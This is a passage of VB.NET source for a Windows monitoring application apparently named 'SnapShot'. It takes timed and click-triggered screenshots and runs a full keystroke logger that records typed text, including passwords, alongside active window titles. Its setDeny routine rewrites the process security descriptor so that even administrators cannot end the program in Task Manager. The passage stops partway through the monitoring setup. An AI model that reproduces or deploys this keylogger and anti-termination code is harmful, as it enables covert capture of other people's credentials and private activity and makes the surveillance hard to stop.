' required for the administrator authentication function:
Imports System.Security.Principal
Imports System.Security.Permissions
Imports System.Runtime.InteropServices

Imports System.Environment ' provides access to the host name
Imports System.DirectoryServices ' provides access to the local Administrators group
Imports System.IO ' log file IO
Imports System.Text ' needed for StringBuilder function used in some API declarations
Imports System.Drawing.Imaging ' controlling the quality of JPGs produced

Public Class Form1
    ' The following three declarations are required for the administrator authentication:
    ' The LogonUser function tries to log on to the local computer by using the specified user name. The function authenticates the Windows user with the password provided.
    Private Declare Auto Function LogonUser Lib "advapi32.dll" (ByVal lpszUsername As [String], ByVal lpszDomain As [String], ByVal lpszPassword As [String], ByVal dwLogonType As Integer, ByVal dwLogonProvider As Integer, ByRef phToken As IntPtr) As Boolean
    <DllImport("Advapi32.dll", CharSet:=CharSet.Auto, SetLastError:=True, ExactSpelling:=False)>
    Private Shared Function ConvertStringSecurityDescriptorToSecurityDescriptor(ByVal StringSecurityDescriptor As String, ByVal StringSDRevision As UInt32, ByRef SecurityDescriptor As IntPtr, ByRef SecurityDescriptorSize As Integer) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential)>
    Private Structure SECURITY_ATTRIBUTES
        Public Length As Integer
        Public lpSecurityDescriptor As IntPtr
        Public bInheritHandle As Boolean
    End Structure

    ' The following declaration is used to prevent the process being killed in Task Manager
    <DllImport("advapi32.dll", CharSet:=CharSet.Ansi, SetLastError:=True)>
    Private Shared Function SetKernelObjectSecurity(ByVal hObject As IntPtr, ByVal SecurityInformation As Integer, ByVal pSecurityDescriptor As IntPtr) As Integer
    End Function

    ' The following functions return the window title for use in the log file:
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Shared Function GetWindowTextLength(ByVal hwnd As IntPtr) As Integer
    End Function
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Shared Function GetWindowText(ByVal hwnd As IntPtr, ByVal lpString As StringBuilder, ByVal cch As Integer) As Integer
    End Function
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function

    Public Const DATE_FORMAT As String = "HHmmss" ' unique file names
    Public Const LOG_FILE As String = "Keyboard.txt" ' key logger
    Public Const TRACE_FILE As String = "Trace.txt" ' debug
    Public Const MILLISECONDS As Integer = 1000

    ' raw input declarations
    ' RAWKEYBOARD.VKey
    Const VK_BACK As UShort = &H8 ' backspace key
    Const VK_TAB As UShort = &H9 ' tab key
    Const VK_CLEAR As UShort = &HC ' clear key
    Const VK_RETURN As UShort = &HD ' enter key
    Const VK_SHIFT As UShort = &H10 ' shift key
    Const VK_CONTROL As UShort = &H11 ' control key
    Const VK_MENU As UShort = &H12 ' control key
    Const VK_CAPITAL As UShort = &H14 ' caps lock key
    Const VK_ESCAPE As UShort = &H1B ' esc key
    Const VK_SPACE As UShort = &H20 ' space bar
    Const VK_PRIOR As UShort = &H21 ' PAGE-UP key
    Const VK_NEXT As UShort = &H22 ' PAGE-DOWN key
    Const VK_END As UShort = &H23 ' End key
    Const VK_HOME As UShort = &H24 ' Home key
    Const VK_LEFT As UShort = &H25 ' left arrow key
    Const VK_UP As UShort = &H26 ' up arrow key
    Const VK_RIGHT As UShort = &H27 ' right arrow key
    Const VK_DOWN As UShort = &H28 ' down arrow key
    Const VK_SNAPSHOT As UShort = &H2C ' print screen key
    Const VK_INSERT As UShort = &H2D ' insert key
    Const VK_DELETE As UShort = &H2E ' delete key
    Const VK_OEM_3 As UShort = &HC0 ' ` key
    Const Key1 As UShort = &H31 ' 1 key
    Const Key2 As UShort = &H32 ' 2 key
    Const Key3 As UShort = &H33 ' 3 key
    Const Key4 As UShort = &H34 ' 4 key
    Const Key5 As UShort = &H35 ' 5 key
    Const Key6 As UShort = &H36 ' 6 key
    Const Key7 As UShort = &H37 ' 7 key
    Const Key8 As UShort = &H38 ' 8 key
    Const Key9 As UShort = &H39 ' 9 key
    Const Key0 As UShort = &H30 ' 0 key
    Const aKey As UShort = &H41 ' A key
    Const bKey As UShort = &H42 ' B key
    Const cKey As UShort = &H43 ' C key
    Const dKey As UShort = &H44 ' D key
    Const eKey As UShort = &H45 ' E key
    Const fKey As UShort = &H46 ' F key
    Const gKey As UShort = &H47 ' G key
    Const hKey As UShort = &H48 ' H key
    Const iKey As UShort = &H49 ' I key
    Const jKey As UShort = &H4A ' J key
    Const kKey As UShort = &H4B ' K key
    Const lKey As UShort = &H4C ' L key
    Const mKey As UShort = &H4D ' M key
    Const nKey As UShort = &H4E ' N key
    Const oKey As UShort = &H4F ' O key
    Const pKey As UShort = &H50 ' P key
    Const qKey As UShort = &H51 ' Q key
    Const rKey As UShort = &H52 ' R key
    Const sKey As UShort = &H53 ' S key
    Const tKey As UShort = &H54 ' T key
    Const uKey As UShort = &H55 ' U key
    Const vKey As UShort = &H56 ' V key
    Const wKey As UShort = &H57 ' W key
    Const xKey As UShort = &H58 ' X key
    Const yKey As UShort = &H59 ' Y key
    Const zKey As UShort = &H5A ' Z key
    Const VK_LWIN As UShort = &H5B ' left Windows key
    Const VK_RWIN As UShort = &H5C ' right Windows key
    Const VK_NUMPAD0 As UShort = &H60 ' num pad 0 key
    Const VK_NUMPAD1 As UShort = &H61 ' num pad 1 key
    Const VK_NUMPAD2 As UShort = &H62 ' num pad 2 key
    Const VK_NUMPAD3 As UShort = &H63 ' num pad 3 key
    Const VK_NUMPAD4 As UShort = &H64 ' num pad 4 key
    Const VK_NUMPAD5 As UShort = &H65 ' num pad 5 key
    Const VK_NUMPAD6 As UShort = &H66 ' num pad 6 key
    Const VK_NUMPAD7 As UShort = &H67 ' num pad 7 key
    Const VK_NUMPAD8 As UShort = &H68 ' num pad 8 key
    Const VK_NUMPAD9 As UShort = &H69 ' num pad 9 key
    Const VK_MULTIPLY As UShort = &H6A ' num pad multiply key
    Const VK_ADD As UShort = &H6B ' num pad add key
    Const VK_SUBTRACT As UShort = &H6D ' num pad subtract key
    Const VK_DECIMAL As UShort = &H6E ' num pad decimal key
    Const VK_DIVIDE As UShort = &H6F ' num pad divide key
    Const VK_F1 As UShort = &H70 ' F1 key
    Const VK_F2 As UShort = &H71 ' F2 key
    Const VK_F3 As UShort = &H72 ' F3 key
    Const VK_F4 As UShort = &H73 ' F4 key
    Const VK_F5 As UShort = &H74 ' F5 key
    Const VK_F6 As UShort = &H75 ' F6 key
    Const VK_F7 As UShort = &H76 ' F7 key
    Const VK_F8 As UShort = &H77 ' F8 key
    Const VK_F9 As UShort = &H78 ' F9 key
    Const VK_F10 As UShort = &H79 ' F10 key
    Const VK_F11 As UShort = &H7A ' F11 key
    Const VK_F12 As UShort = &H7B ' F12 key
    Const VK_NUMLOCK As UShort = &H90 ' num lock key
    Const VK_OEM_1 As UShort = &HBA ' ; key
    Const VK_OEM_PLUS As UShort = &HBB ' = key
    Const VK_OEM_COMMA As UShort = &HBC ' , key
    Const VK_OEM_MINUS As UShort = &HBD ' - key
    Const VK_OEM_PERIOD As UShort = &HBE ' . key
    Const VK_OEM_2 As UShort = &HBF ' / key
    Const VK_OEM_4 As UShort = &HDB ' [ key
    Const VK_OEM_5 As UShort = &HDC ' \ key
    Const VK_OEM_6 As UShort = &HDD ' ] key
    Const VK_OEM_7 As UShort = &HDE ' ' key

    ' RAWKEYBOARD.Flags
    Const RI_KEY_MAKE As UShort = 0 ' key down
    Const RI_KEY_BREAK As UShort = 1 ' key up

    ' RAWMOUSE.buttonsStr.usButtonData
    Const RI_MOUSE_LEFT_BUTTON_DOWN As UShort = &H1 ' left mouse button down
    Const RI_MOUSE_LEFT_BUTTON_UP As UShort = &H2 ' left mouse button up
    Const RI_MOUSE_MIDDLE_BUTTON_DOWN As UShort = &H10 ' middle mouse button down
    Const RI_MOUSE_MIDDLE_BUTTON_UP As UShort = &H20 ' middle mouse button up
    Const RI_MOUSE_RIGHT_BUTTON_DOWN As UShort = &H4 ' right mouse button down
    Const RI_MOUSE_RIGHT_BUTTON_UP As UShort = &H8 ' right mouse button up

    Dim txtLog As String = "" ' capture buffer for keyboard events
    Dim isShift, isCaps, isControl, isAlt, isNumLock As Boolean ' track special keys
    Dim stillCaps As Boolean = False ' true if user is holding down caps lock
    Dim stillNum As Boolean = False ' true if user is holding down num lock
    Dim LocalDir As String = My.Computer.FileSystem.SpecialDirectories.MyPictures + "\SnapShot" ' default local image repository
    Dim prevWindow As IntPtr ' track if user has clicked on a new window
    Dim starting As Boolean = True ' only true on initial startup
    Private InputHook As RawInputHook ' mouse & keyboard monitor
    Dim BalloonUp As Boolean = False ' track visibility of balloontip on system tray icon
    Dim lastNotified As DateTime = DateTime.MinValue ' prevent re-display of system tray balloontip

    Private Shared Sub RecoverImages(ByVal sourceDirName As String, ByVal destDirName As String)
        ' Move all locally cached files to the preferred repository location.
        ' Get the subdirectories for the specified directory. 
        If Not Directory.Exists(sourceDirName) Then
            Throw New DirectoryNotFoundException("Source directory does not exist or could not be found: " + sourceDirName)
        End If
        ' If the destination directory doesn't exist, create it. 
        If Not Directory.Exists(destDirName) Then
            Directory.CreateDirectory(destDirName)
        End If
        ' Get the files in the directory and copy them to the new location. 
        Dim dir As DirectoryInfo = New DirectoryInfo(sourceDirName)
        Dim files As FileInfo() = dir.GetFiles()
        For Each file In files
            Dim temppath As String = Path.Combine(destDirName, file.Name)
            If IO.File.Exists(temppath) Then
                file.CopyTo(temppath + Now.ToString(DATE_FORMAT), False)
            Else
                file.CopyTo(temppath, False)
            End If
        Next file
        Dim dirs As DirectoryInfo() = dir.GetDirectories()
        For Each subdir In dirs
            Dim temppath As String = Path.Combine(destDirName, subdir.Name)
            RecoverImages(subdir.FullName, temppath)
        Next subdir
    End Sub

    Public Function GetFolder() As String
        ' SnapShot is designed so that the user can point to a central location for the image repository eg a shared drive
        ' from a server.  This makes file IO vulnerable to network outages - an attempt to access a folder that is no longer
        ' reachable would generate an error.  To prevent the program crashing, the repository's availability is verified each time.
        ' The existence of the root image repository folder is confirmed and if missing, a new, local folder is created.  Since
        ' the check is conducted each time, the image files resume saving to their original location as soon as network connectivity
        ' is restored.
        Dim folder As String = My.Settings.ImageFolder
        If Directory.Exists(folder) Then ' preferred repository is available
            If Directory.Exists(LocalDir) And LocalDir <> folder Then
                RecoverImages(LocalDir, folder) ' move any local images to preferred repository
                Directory.Delete(LocalDir, True) ' delete the local repository
            End If
        Else ' preferred respository deleted or was on remote file system, so...
            Directory.CreateDirectory(LocalDir) ' create a local dir
            folder = LocalDir
        End If
        ' rebuild folder path below root folder as follows: hostname\year\month\day
        If Not Directory.Exists(folder + "\" + MachineName) Then Directory.CreateDirectory(folder + "\" + MachineName)
        folder += "\" + MachineName
        If Not Directory.Exists(folder + "\" + Now.Year.ToString) Then Directory.CreateDirectory(folder + "\" + Now.Year.ToString)
        folder += "\" + Now.Year.ToString
        If Not Directory.Exists(folder + "\" + Now.ToString("MM")) Then Directory.CreateDirectory(folder + "\" + Now.ToString("MM"))
        folder += "\" + Now.ToString("MM")
        If Not Directory.Exists(folder + Now.ToString("dd")) Then Directory.CreateDirectory(folder + "\" + Now.ToString("dd"))
        GetFolder = folder + "\" + Now.ToString("dd")
    End Function

    Public Function HasAdmin(userName As String) As Boolean
        ' Only a local administrator is allowed to change the configuration so determine if userName is one.
        Dim Admins As New DirectoryEntry("WinNT://" & MachineName & "/Administrators") ' access the local administrators group
        Dim Members As Object = Admins.Invoke("Members", Nothing) ' obtain the members of this group
        HasAdmin = False
        For Each Member As Object In CType(Members, IEnumerable) ' iterate through members looking for userName
            Dim CurrentMember As New DirectoryEntry(Member)
            If CurrentMember.Name = userName Then ' found them
                HasAdmin = True
            End If
        Next
    End Function

    Public Sub DisableSettings()
        ' disable the settings section
        ' background image:
        Me.BackgroundImage = My.Resources.banned
        ' image folder:
        Button1.Enabled = False
        Label3.Enabled = False
        Button1.Visible = False
        Label3.Visible = False
        ' frequency:
        Label5.Enabled = False
        NumericUpDown1.Enabled = False
        Label6.Enabled = False
        Label5.Visible = False
        NumericUpDown1.Visible = False
        Label6.Visible = False
        ' JPEG quality:
        Label10.Enabled = False
        TrackBar2.Enabled = False
        Label11.Enabled = False
        Label12.Enabled = False
        Label10.Visible = False
        TrackBar2.Visible = False
        Label11.Visible = False
        Label12.Visible = False
        ' free space:
        Label7.Enabled = False
        TrackBar1.Enabled = False
        Label8.Enabled = False
        Label9.Enabled = False
        Label7.Visible = False
        TrackBar1.Visible = False
        Label8.Visible = False
        Label9.Visible = False
        ' mouse click:
        CheckBox1.Enabled = False
        CheckBox1.Visible = False
        ' key log:
        CheckBox2.Enabled = False
        CheckBox2.Visible = False
        ' OK button
        Button2.Enabled = False
        Button2.Visible = False
        ' Exit button
        Button4.Enabled = False
        Button4.Visible = False

        ' enable the authentication section
        GroupBox1.Enabled = True
        Label1.Enabled = True
        TextBox1.Enabled = True
        TextBox1.Text = ""
        Label2.Enabled = True
        TextBox2.Enabled = True
        TextBox2.Text = ""
    End Sub

    Public Sub EnableSettings()
        ' enable the settings section
        ' background image:
        Me.BackgroundImage = Nothing
        ' image folder:
        Button1.Enabled = True
        Label3.Enabled = True
        Button1.Visible = True
        Label3.Visible = True
        ' frequency:
        Label5.Enabled = True
        NumericUpDown1.Enabled = True
        Label6.Enabled = True
        Label5.Visible = True
        NumericUpDown1.Visible = True
        Label6.Visible = True
        ' JPEG quality:
        Label10.Enabled = True
        TrackBar2.Enabled = True
        Label11.Enabled = True
        Label12.Enabled = True
        Label10.Visible = True
        TrackBar2.Visible = True
        Label11.Visible = True
        Label12.Visible = True
        ' free space:
        Label7.Enabled = True
        TrackBar1.Enabled = True
        Label8.Enabled = True
        Label9.Enabled = True
        Label7.Visible = True
        TrackBar1.Visible = True
        Label8.Visible = True
        Label9.Visible = True
        ' mouse click:
        CheckBox1.Enabled = True
        CheckBox1.Visible = True
        ' key log:
        CheckBox2.Enabled = True
        CheckBox2.Visible = True
        ' OK button
        Button2.Enabled = True
        Button2.Visible = True
        ' Exit button
        Button4.Enabled = True
        Button4.Visible = True

        ' disable the authentication section
        GroupBox1.Enabled = False
        Label1.Enabled = False
        TextBox1.Enabled = False
        Label2.Enabled = False
        TextBox2.Enabled = False
    End Sub

    Public Function ValidateAdmin() As Boolean
        ' Authenticate the supplied administrator credentials.
        Dim tokenHandle As New IntPtr(0)
        Const LOGON32_PROVIDER_DEFAULT As Integer = 0
        Const LOGON32_LOGON_INTERACTIVE As Integer = 2
        tokenHandle = IntPtr.Zero
        ' Firstly, confirm the login and password check out:
        Dim returnValue As Boolean = LogonUser(TextBox1.Text, MachineName, TextBox2.Text, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, tokenHandle)
        ' Secondly, check the username is a local administrator:
        ValidateAdmin = IIf(returnValue, HasAdmin(TextBox1.Text), False)
    End Function

    Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
        Dim j As Integer
        Dim encoders() As ImageCodecInfo
        encoders = ImageCodecInfo.GetImageEncoders()
        j = 0
        While j < encoders.Length
            If encoders(j).FormatID = format.Guid Then
                Return encoders(j)
            End If
            j += 1
        End While
        Return Nothing
    End Function

    Public Sub SaveScreen()
        ' Take a screen shot.
        If EnoughSpace() Then ' check we are preserving the guaranteed amount of free disk space
            Dim filename As String = GetFolder() + "\" + Now.ToString(DATE_FORMAT) + ".jpg" ' HHmmss.jpg
            Try
                Dim myImageCodecInfo As ImageCodecInfo
                Dim myEncoder As Imaging.Encoder
                Dim myEncoderParameter As EncoderParameter
                Dim myEncoderParameters As EncoderParameters
                Dim screenSize = SystemInformation.PrimaryMonitorSize
                Dim mybitmap = New Bitmap(screenSize.Width, screenSize.Height)
                Dim g = Graphics.FromImage(mybitmap)
                g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize) ' take the screen shot
                g.Flush()

                myImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg) ' Get an ImageCodecInfo object that represents the JPEG codec.
                myEncoder = Imaging.Encoder.Quality ' Create an Encoder object based on the GUID for the Quality parameter category.

                ' Create an EncoderParameters object. 
                ' An EncoderParameters object has an array of EncoderParameter 
                ' objects. In this case, there is only one 
                ' EncoderParameter object in the array.
                myEncoderParameters = New EncoderParameters(1)

                ' Save the bitmap as a JPEG file
                myEncoderParameter = New EncoderParameter(myEncoder, CType(My.Settings.ImageQuality, Int32))
                myEncoderParameters.Param(0) = myEncoderParameter
                mybitmap.Save(filename, myImageCodecInfo, myEncoderParameters)
                mybitmap.Dispose()
                g.Dispose()
            Catch ex As ComponentModel.Win32Exception
            Catch ex2 As ArgumentException
            Catch ex3 As IOException
            End Try
        End If
    End Sub

    Public Sub SaveLog()
        ' write the buffered log content to file.
        If CheckBox2.Checked Then ' if key logging...
            Try
                File.AppendAllText(GetFolder() + "\" + LOG_FILE, txtLog + vbCrLf) ' save the current line of text to the log file
            Catch ex As System.ComponentModel.Win32Exception
            Catch ex2 As System.ArgumentException
            Catch ex3 As System.IO.IOException
            End Try
        End If
        txtLog = Now.ToString(DATE_FORMAT + ":") ' start next line of text
    End Sub

    Public Function EnoughSpace() As Boolean
        ' check we don't eat into the minimum amount of free disk space requested in the configuration.
        Try
            Dim thisDrive As New DriveInfo(GetFolder())
            EnoughSpace = thisDrive.TotalFreeSpace > My.Settings.FreeSpace * 1024 ' comparison using bytes
        Catch ex3 As IOException
            EnoughSpace = False
        End Try
    End Function

    Public Sub SaveSettings()
        ' save the user configuration
        ' image folder
        My.Settings.ImageFolder = Label3.Text
        ' frequency
        My.Settings.Frequency = NumericUpDown1.Value
        Timer1.Interval = NumericUpDown1.Value * MILLISECONDS
        Timer1.Stop()
        Timer1.Start()
        ' JPEG quality
        My.Settings.ImageQuality = TrackBar2.Value
        ' free space
        My.Settings.FreeSpace = TrackBar1.Value
        ' mouse click
        My.Settings.MouseImage = CheckBox1.Checked
        ' key log
        My.Settings.KeyLog = CheckBox2.Checked
        ' save them to the settings file
        My.Settings.Save()
    End Sub

    Public Sub setDeny()
        ' change permissions on the process so that it cannot be killed in Task Manager
        Const SDDL_REVISION_1 As Integer = 1
        Const DACL_SECURITY_INFORMATION As Integer = &H4
        Dim ssdl As String
        ssdl = "D:"                       '// Discretionary ACL
        ssdl &= "(D;OICI;GA;;;BG)"        '// Deny access to built-in guests
        ssdl &= "(D;OICI;GA;;;AN)"        '// Deny access to anonymous logon 
        ssdl &= "(D;OICI;GA;;;AU)"        '// Deny access to authenticated users
        ssdl &= "(D;OICI;GA;;;BA)"        '// Deny access to administrators
        Dim sa As New SECURITY_ATTRIBUTES
        sa.bInheritHandle = False
        sa.lpSecurityDescriptor = IntPtr.Zero
        sa.Length = Marshal.SizeOf(sa)
        Dim result As Boolean = ConvertStringSecurityDescriptorToSecurityDescriptor(ssdl, SDDL_REVISION_1, sa.lpSecurityDescriptor, Nothing)
        Dim myProcessHandle As IntPtr = System.Diagnostics.Process.GetCurrentProcess.Handle
        Dim iResult As Integer = SetKernelObjectSecurity(myProcessHandle, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor)
    End Sub

    Public Sub LoadSettings()
        ' restore settings from file:
        My.Settings.Reload()
        ' image folder
        If My.Settings.ImageFolder = "" Then
            My.Settings.ImageFolder = My.Computer.FileSystem.SpecialDirectories.MyPictures + "\SnapShot"
        End If
        Label3.Text = My.Settings.ImageFolder
        ' frequency
        If My.Settings.Frequency = 0 Then
            My.Settings.Frequency = 60
        End If
        NumericUpDown1.Value = My.Settings.Frequency ' display setting
        Timer1.Interval = My.Settings.Frequency * MILLISECONDS ' use setting
        Timer1.Stop()
        Timer1.Start()
        ' JPEG quality
        If My.Settings.ImageQuality = 0 Then
            My.Settings.ImageQuality = 100
        End If
        TrackBar2.Value = My.Settings.ImageQuality
        Label10.Text = My.Settings.ImageQuality
        ' free space
        If My.Settings.FreeSpace = 0 Then
            My.Settings.FreeSpace = 100
        End If
        TrackBar1.Value = My.Settings.FreeSpace
        Label9.Text = My.Settings.FreeSpace
        ' mouse click
        CheckBox1.Checked = My.Settings.MouseImage
        ' key log
        CheckBox2.Checked = My.Settings.KeyLog
    End Sub

    Public Sub InputFromKeyboard(ByVal riHeader As RAWINPUTHEADER, ByVal riKeyboard As RAWKEYBOARD)
        ' key logging
        Select Case riKeyboard.Flags
            Case RI_KEY_MAKE ' key down
                Select Case riKeyboard.VKey
                    Case VK_TAB, VK_BACK, VK_ESCAPE, VK_PRIOR, VK_NEXT, VK_END, VK_HOME, VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN, VK_SNAPSHOT, VK_INSERT, VK_DELETE, VK_LWIN, VK_RWIN, VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12 ' special keys
                        txtLog += InputHook.FriendlyKeyname(riKeyboard.VKey)
                    Case VK_RETURN ' enter key
                        SaveLog() ' save current line of text to log file and start a new line
                    Case VK_SHIFT ' shift key
                        isShift = True
                    Case VK_CONTROL ' control key
                        If Not isControl Then
                            txtLog += InputHook.FriendlyKeyname(riKeyboard.VKey)
                        End If
                        isControl = True
                    Case VK_MENU ' alt key
                        If Not isAlt Then
                            txtLog += InputHook.FriendlyKeyname(riKeyboard.VKey)
                        End If
                        isAlt = True
                    Case VK_CAPITAL ' caps lock
                        isCaps = IIf(stillCaps, isCaps, Not isCaps) ' toggle only if initial key press, not if being held down
                        stillCaps = True ' key is being held down
                    Case VK_SPACE ' space key
                        txtLog += " "
                    Case VK_OEM_3 ' ` key
                        txtLog += IIf(isShift, "`", "~")
                    Case Key1 ' 1 key
                        txtLog += IIf(isShift, "!", "1")
                    Case Key2 ' 2 key
                        txtLog += IIf(isShift, "@", "2")
                    Case Key3 ' 3 key
                        txtLog += IIf(isShift, "#", "3")
                    Case Key4 ' 4 key
                        txtLog += IIf(isShift, "$", "4")
                    Case Key5 ' 5 key
                        txtLog += IIf(isShift, "%", "5")
                    Case Key6 ' 6 key
                        txtLog += IIf(isShift, "^", "6")
                    Case Key7 ' 7 key
                        txtLog += IIf(isShift, "&", "7")
                    Case Key8 ' 8 key
                        txtLog += IIf(isShift, "*", "8")
                    Case Key9 ' 9 key
                        txtLog += IIf(isShift, "(", "9")
                    Case Key0 ' 0 key
                        txtLog += IIf(isShift, ")", "0")
                    Case aKey ' A key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "A", "a")
                    Case bKey ' B key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "B", "b")
                    Case cKey ' C key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "C", "c")
                    Case dKey ' D key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "D", "d")
                    Case eKey ' E key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "E", "e")
                    Case fKey ' F key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "F", "f")
                    Case gKey ' G key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "G", "g")
                    Case hKey ' H key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "H", "h")
                    Case iKey ' I key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "I", "i")
                    Case jKey ' J key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "J", "j")
                    Case kKey ' K key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "K", "k")
                    Case lKey ' L key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "L", "l")
                    Case mKey ' M key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "M", "m")
                    Case nKey ' N key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "N", "n")
                    Case oKey ' O key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "O", "o")
                    Case pKey ' P key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "P", "p")
                    Case qKey ' Q key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "Q", "q")
                    Case rKey ' R key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "R", "r")
                    Case sKey ' S key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "S", "s")
                    Case tKey ' T key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "T", "t")
                    Case uKey ' U key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "U", "u")
                    Case vKey ' V key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "V", "v")
                    Case wKey ' W key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "W", "w")
                    Case xKey ' X key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "X", "x")
                    Case yKey ' Y key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "Y", "y")
                    Case zKey ' Z key
                        txtLog += IIf((isShift And Not isCaps) Or (Not isShift And isCaps), "Z", "z")
                    Case VK_NUMPAD0 ' num pad 0 key
                        txtLog += IIf(isNumLock, "0", VK_INSERT)
                    Case VK_NUMPAD1 ' num pad 1 key
                        txtLog += IIf(isNumLock, "1", VK_END)
                    Case VK_NUMPAD2 ' num pad 2 key
                        txtLog += IIf(isNumLock, "2", VK_DOWN)
                    Case VK_NUMPAD3 ' num pad 3 key
                        txtLog += IIf(isNumLock, "3", VK_NEXT)
                    Case VK_NUMPAD4 ' num pad 4 key
                        txtLog += IIf(isNumLock, "4", VK_LEFT)
                    Case VK_NUMPAD5 ' num pad 5 key
                        txtLog += IIf(isNumLock, "5", VK_CLEAR)
                    Case VK_NUMPAD6 ' num pad 6 key
                        txtLog += IIf(isNumLock, "6", VK_RIGHT)
                    Case VK_NUMPAD7 ' num pad 7 key
                        txtLog += IIf(isNumLock, "7", VK_HOME)
                    Case VK_NUMPAD8 ' num pad 8 key
                        txtLog += IIf(isNumLock, "8", VK_UP)
                    Case VK_NUMPAD9 ' num pad 9
                        txtLog += IIf(isNumLock, "9", VK_PRIOR)
                    Case VK_MULTIPLY ' num pad multiply
                        txtLog += "*"
                    Case VK_ADD ' num pad add
                        txtLog += "+"
                    Case VK_SUBTRACT ' num pad subtract
                        txtLog += "-"
                    Case VK_DECIMAL ' num pad decimal
                        txtLog += "."
                    Case VK_DIVIDE ' num pad divide
                        txtLog += "/"
                    Case VK_NUMLOCK ' num lock
                        isNumLock = IIf(stillNum, isNumLock, Not isNumLock) ' toggle only if initial key press, not if being held down
                        stillNum = True ' key is being held down
                    Case VK_OEM_PLUS ' = key
                        txtLog += IIf(isShift, "+", "=")
                    Case VK_OEM_COMMA ' , key
                        txtLog += IIf(isShift, "<", ",")
                    Case VK_OEM_PERIOD ' . key
                        txtLog += IIf(isShift, ">", ".")
                    Case VK_OEM_MINUS ' - key
                        txtLog += IIf(isShift, "_", "-")
                    Case VK_OEM_2 ' / key
                        txtLog += IIf(isShift, "?", "/")
                    Case VK_OEM_1 ' ; key
                        txtLog += IIf(isShift, ":", ";")
                    Case VK_OEM_4 ' [ key
                        txtLog += IIf(isShift, "{", "[")
                    Case VK_OEM_5 ' \ key
                        txtLog += IIf(isShift, "|", "\")
                    Case VK_OEM_6 ' ] key
                        txtLog += IIf(isShift, "}", "]")
                    Case VK_OEM_7 ' ' key
                        txtLog += IIf(isShift, """", "'")
                End Select
            Case RI_KEY_BREAK ' key up
                Select Case riKeyboard.VKey
                    Case VK_SHIFT ' shift key
                        isShift = False
                    Case VK_CONTROL ' control key
                        isControl = False
                    Case VK_MENU ' alt key
                        isAlt = False
                    Case VK_CAPITAL ' caps lock
                        stillCaps = False
                    Case VK_NUMLOCK ' num lock
                        stillNum = False
                End Select
        End Select
    End Sub

    Public Sub InputFromMouse(ByVal riHeader As RAWINPUTHEADER, ByVal riMouse As RAWMOUSE)
        ' mouse logging
        Select Case riMouse.buttonsStr.usButtonFlags
            Case RI_MOUSE_LEFT_BUTTON_DOWN ' any mouse button down
                txtLog += "{Left CLICK}"
                If CheckBox1.Checked Then
                    SaveScreen()
                End If
            Case RI_MOUSE_MIDDLE_BUTTON_DOWN ' any mouse button down
                txtLog += "{Middle CLICK}"
                If CheckBox1.Checked Then
                    SaveScreen()
                End If
            Case RI_MOUSE_RIGHT_BUTTON_DOWN ' any mouse button down
                txtLog += "{Right CLICK}"
                If CheckBox1.Checked Then
                    SaveScreen()
                End If
            Case RI_MOUSE_LEFT_BUTTON_UP, RI_MOUSE_MIDDLE_BUTTON_UP, RI_MOUSE_RIGHT_BUTTON_UP
                If prevWindow <> GetForegroundWindow() Then ' only log the window title if it's a different window
                    prevWindow = GetForegroundWindow() ' remember this window
                    SaveLog() ' save current line
                    Dim FormTitle As New StringBuilder(GetWindowTextLength(GetForegroundWindow) + 1)
                    Dim RetVal As Long = GetWindowText(GetForegroundWindow, FormTitle, FormTitle.Capacity) ' get window title
                    txtLog += "SELECTED: " + FormTitle.ToString + vbCrLf + Now.ToString(DATE_FORMAT + ":") ' prefix next section of log with relevant window title
                End If
        End Select
    End Sub

    Public Sub StartMonitoring()
        ' initiates raw input from mouse and keyboard
        ' determine current state of special keys
        isCaps = My.Computer.Keyboard.CapsLock
        isShift = My.Computer.Keyboard.ShiftKeyDown
        isControl = My.Computer.Keyboard.CtrlKeyDown
        isAlt = My.Computer.Keyboard.AltKeyDown
        isNumLock = My.Computer.Keyboard.NumLock

        ' start keyboard and mouse monitoring
        InputHook = New RawInputHook()
        AddHandler InputHook.OnRawInputFromKeyboard, AddressOf InputFromKeyboard
        AddHandler InputHook.OnRawInputFromMouse, AddressOf InputFromMouse

